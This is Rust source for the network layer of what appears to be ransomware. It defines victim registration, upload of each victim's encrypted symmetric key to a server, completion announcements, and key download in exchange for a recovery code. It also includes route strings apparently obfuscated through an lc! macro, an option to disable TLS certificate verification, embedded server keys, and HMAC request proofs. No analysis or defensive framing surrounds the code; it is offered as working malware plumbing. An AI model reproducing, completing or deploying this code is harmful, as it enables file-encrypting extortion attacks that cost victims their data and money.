#![allow(
    clippy::missing_errors_doc,
    clippy::missing_panics_doc,
    reason = "wire helpers document outcomes on their public types"
)]

pub mod types {
    macro_rules! wire_string_newtype {
        ($(#[$meta:meta])* $name:ident) => {
            $(#[$meta])*
            #[derive(
                Clone,
                Debug,
                Default,
                PartialEq,
                Eq,
                serde::Serialize,
                serde::Deserialize,
            )]
            pub struct $name(pub String);

            impl $name {
                #[must_use]
                pub const fn new(value: String) -> Self {
                    Self(value)
                }

                #[must_use]
                pub fn as_str(&self) -> &str {
                    &self.0
                }

                #[must_use]
                pub const fn as_bytes(&self) -> &[u8] {
                    self.0.as_bytes()
                }

                #[must_use]
                pub fn into_string(self) -> String {
                    self.0
                }
            }

            impl std::fmt::Display for $name {
                fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
                    f.write_str(&self.0)
                }
            }
        };
    }

    wire_string_newtype! {
        VictimId
    }

    wire_string_newtype! {
        Proof
    }

    wire_string_newtype! {
        RecoveryCode
    }

    wire_string_newtype! {
        EncryptedSymKey
    }
}

pub mod structs {
    use serde::{Deserialize, Serialize};

    use super::types::{EncryptedSymKey, Proof, RecoveryCode, VictimId};

    #[derive(Serialize, Deserialize, Debug)]
    #[serde(deny_unknown_fields)]
    pub struct Registration {
        pub id: VictimId,
        pub hostname: String,
        pub proof: Proof,
    }

    #[derive(Serialize, Deserialize, Debug)]
    #[serde(deny_unknown_fields)]
    pub struct UploadSymKey {
        pub id: VictimId,
        pub key: EncryptedSymKey,
        pub proof: Proof,
    }

    #[derive(Serialize, Deserialize, Debug)]
    #[serde(deny_unknown_fields)]
    pub struct AnnounceCompletion {
        pub id: VictimId,
        pub proof: Proof,
    }

    #[derive(Serialize, Deserialize, Debug)]
    #[serde(deny_unknown_fields)]
    pub struct DownloadSymKey {
        pub id: VictimId,
        pub code: RecoveryCode,
        pub proof: Proof,
    }
}

pub mod responses {
    #[derive(Debug, Clone, Copy, PartialEq, Eq)]
    pub enum ServerResponse {
        Success,
    }

    impl ServerResponse {
        #[must_use]
        pub const fn as_str(self) -> &'static str {
            match self {
                Self::Success => "Success",
            }
        }

        #[must_use]
        pub fn parse(body: &str) -> Option<Self> {
            (body == Self::Success.as_str()).then_some(Self::Success)
        }
    }
}

pub mod codes {
    pub const RECOVERY_REQUEST_CODE: &str = "0000-0000-0000-0000";
}

pub mod routes {
    use std::sync::LazyLock;

    pub static REGISTER: LazyLock<String> = LazyLock::new(|| lc!("/register"));
    pub static UPLOAD_SYM_KEY: LazyLock<String> = LazyLock::new(|| lc!("/upload-sym-key"));
    pub static ANNOUNCE_COMPLETION: LazyLock<String> =
        LazyLock::new(|| lc!("/announce-completion"));
    pub static DOWNLOAD_SYM_KEY: LazyLock<String> = LazyLock::new(|| lc!("/download-sym-key"));
    pub static DOWNLOAD_DIR: LazyLock<String> = LazyLock::new(|| lc!("/download"));
    pub static ASYM_PUB_KEY_PATH: LazyLock<String> =
        LazyLock::new(|| lc!("/download/asym-pub-key.pem"));
}

pub mod client {
    use std::{sync::LazyLock, time::Duration};

    use serde::Serialize;
    use tracing::debug;
    use ureq::{
        Agent,
        tls::{Certificate, RootCerts, TlsConfig},
    };

    use crate::{
        error::Error,
        web::{
            client_tls::ca_certificate,
            ureq_client::{web_get_recv_bytes_ureq, web_post_send_json_recv_text_ureq},
        },
    };

    fn agent_from_config(tls_config: TlsConfig) -> Agent {
        Agent::config_builder()
            .tls_config(tls_config)
            .timeout_global(Some(Duration::from_secs(30)))
            .timeout_connect(Some(Duration::from_secs(10)))
            .build()
            .into()
    }

    fn create_agent_without_verification() -> Agent {
        debug!("Creating web client without server certificate verification");
        agent_from_config(TlsConfig::builder().disable_verification(true).build())
    }

    fn create_agent_with_verification() -> Result<Agent, &'static str> {
        debug!("Creating web client with server certificate verification");
        let ca_bytes = ca_certificate().map_err(|_| "ca-cert.pem")?;
        let ca_cert = Certificate::from_pem(&ca_bytes).map_err(|_| "ca-cert.pem")?;
        let tls_config = TlsConfig::builder()
            .root_certs(RootCerts::new_with_certs(&[ca_cert]))
            .build();
        Ok(agent_from_config(tls_config))
    }

    static AGENT_VERIFY: LazyLock<Result<Agent, &'static str>> =
        LazyLock::new(create_agent_with_verification);
    static AGENT_NO_VERIFY: LazyLock<Agent> = LazyLock::new(create_agent_without_verification);

    fn agent(verify_server: bool) -> Result<&'static Agent, Error> {
        if verify_server {
            AGENT_VERIFY
                .as_ref()
                .map_err(|&name| Error::EmbeddedAsset { name })
        } else {
            Ok(&AGENT_NO_VERIFY)
        }
    }

    pub fn web_get_recv_bytes(url: &str, verify_server: bool) -> Result<Vec<u8>, Error> {
        web_get_recv_bytes_ureq(agent(verify_server)?, url)
    }

    pub fn web_post_send_json_recv_text<T: Serialize>(
        url: &str,
        json: &T,
        verify_server: bool,
    ) -> Result<String, Error> {
        web_post_send_json_recv_text_ureq(agent(verify_server)?, url, json)
    }
}

pub mod server_tls {
    use std::borrow::Cow;

    use rust_embed::RustEmbed;

    use crate::error::Error;

    #[derive(RustEmbed)]
    #[folder = "assets/cert"]
    #[include = "cert.pem"]
    #[include = "key.pem"]
    struct AssetCertPriv;

    pub fn tls_certificate() -> Result<Cow<'static, [u8]>, Error> {
        AssetCertPriv::get("cert.pem")
            .map(|asset| asset.data)
            .ok_or(Error::EmbeddedAsset { name: "cert.pem" })
    }

    pub fn tls_private_key() -> Result<Cow<'static, [u8]>, Error> {
        AssetCertPriv::get("key.pem")
            .map(|asset| asset.data)
            .ok_or(Error::EmbeddedAsset { name: "key.pem" })
    }
}

pub mod client_tls {
    use std::borrow::Cow;

    use rust_embed::RustEmbed;

    use crate::error::Error;

    #[derive(RustEmbed)]
    #[folder = "assets/cert"]
    #[include = "ca-cert.pem"]
    struct AssetCertPub;

    pub fn ca_certificate() -> Result<Cow<'static, [u8]>, Error> {
        AssetCertPub::get("ca-cert.pem")
            .map(|asset| asset.data)
            .ok_or(Error::EmbeddedAsset {
                name: "ca-cert.pem",
            })
    }
}

pub mod validate {
    use std::sync::LazyLock;

    use hex::{decode, encode};
    use purecrypto::hash::HmacSha256;
    use regex::Regex;

    use super::types::Proof;

    static ID_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[[:alnum:]]{16}$").expect("Invalid Regex"));
    static HOSTNAME_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[0-9A-Za-z.\-]{1,32}$").expect("Invalid Regex"));
    static SHA256_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[a-fA-F0-9]{64}$").expect("Invalid Regex"));
    static CODE_REGEX: LazyLock<Regex> = LazyLock::new(|| {
        Regex::new(r"^[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}$")
            .expect("Invalid Regex")
    });
    static CODE_SEGMENT_REGEX: LazyLock<Regex> =
        LazyLock::new(|| Regex::new(r"^[[:alnum:]]{4}$").expect("Invalid Regex"));

    #[must_use]
    pub fn validate_id(id: &str) -> bool {
        ID_REGEX.is_match(id)
    }

    #[must_use]
    pub fn validate_hostname(hostname: &str) -> bool {
        HOSTNAME_REGEX.is_match(hostname)
    }

    #[must_use]
    pub fn validate_proof(proof: &str) -> bool {
        SHA256_REGEX.is_match(proof)
    }

    #[must_use]
    pub fn validate_key(key: &str) -> bool {
        let len = key.len();
        (128..=1024).contains(&len)
            && len.is_multiple_of(2)
            && key.bytes().all(|byte| byte.is_ascii_hexdigit())
    }

    #[must_use]
    pub fn validate_code_segment(code_segment: &str) -> bool {
        CODE_SEGMENT_REGEX.is_match(code_segment)
    }

    #[must_use]
    pub fn validate_code(code: &str) -> bool {
        CODE_REGEX.is_match(code)
    }

    #[must_use]
    pub fn create_proof(proof_source: &[u8], secret: &str) -> Proof {
        let tag = HmacSha256::mac(secret.as_bytes(), proof_source);
        Proof::new(encode(tag.as_ref()))
    }

    #[must_use]
    pub fn decode_hex<const N: usize>(hex_str: &str) -> Option<[u8; N]> {
        let bytes = decode(hex_str).ok()?;
        bytes.try_into().ok()
    }

    #[must_use]
    pub fn check_proof(proof_source: &[u8], secret: &str, proof: &str) -> bool {
        let Ok(expected) = decode(proof) else {
            return false;
        };
        bool::from(
            HmacSha256::new(secret.as_bytes())
                .chain(proof_source)
                .verify(&expected),
        )
    }
}

mod ureq_client {
    use std::{thread::sleep, time::Duration};

    use serde::Serialize;
    use tracing::{debug, warn};
    use ureq::Agent;

    use crate::error::Error;

    const RETRIES: u8 = 5;
    const INITIAL_RETRY_WAIT_SECS: u64 = 10;
    const MAX_RETRY_WAIT_SECS: u64 = 120;

    fn retry_with_backoff<T, F>(label: &'static str, mut attempt: F) -> Result<T, Error>
    where
        F: FnMut() -> Result<T, ureq::Error>,
    {
        let mut retry_wait = INITIAL_RETRY_WAIT_SECS;
        let mut attempt_no: u8 = 1;
        loop {
            match attempt() {
                Ok(value) => return Ok(value),
                Err(ureq::Error::StatusCode(status)) => {
                    return Err(Error::ServerRejected { label, status });
                }
                Err(
                    error @ (ureq::Error::BadUri(_) | ureq::Error::Http(_) | ureq::Error::Json(_)),
                ) => {
                    return Err(Error::InvalidRequest {
                        label,
                        source: error,
                    });
                }
                Err(error) => {
                    warn!(error = ?error, label, "Failed to receive server response");
                    if attempt_no >= RETRIES {
                        return Err(Error::NoResponse {
                            label,
                            retries: RETRIES,
                            source: error,
                        });
                    }
                    warn!(retry_wait, "Sleeping before retrying");
                    sleep(Duration::from_secs(retry_wait));
                    retry_wait = retry_wait.saturating_mul(2).min(MAX_RETRY_WAIT_SECS);
                    attempt_no += 1;
                }
            }
        }
    }

    pub(crate) fn web_get_recv_bytes_ureq(agent: &Agent, url: &str) -> Result<Vec<u8>, Error> {
        retry_with_backoff("GET", || {
            let response = agent.get(url).call()?;
            debug!(?response, "Received server response to GET");
            let bytes = response.into_body().read_to_vec()?;
            debug!(
                bytes = bytes.len(),
                "Successfully read content bytes from response"
            );
            Ok(bytes)
        })
    }

    pub(crate) fn web_post_send_json_recv_text_ureq<T: Serialize>(
        agent: &Agent,
        url: &str,
        json: &T,
    ) -> Result<String, Error> {
        retry_with_backoff("POST", || {
            let mut response = agent.post(url).send_json(json)?;
            debug!(?response, "Received server response to POST");
            let text = response.body_mut().read_to_string()?;
            debug!(bytes = text.len(), "Successfully read response bytes");
            Ok(text)
        })
    }
}
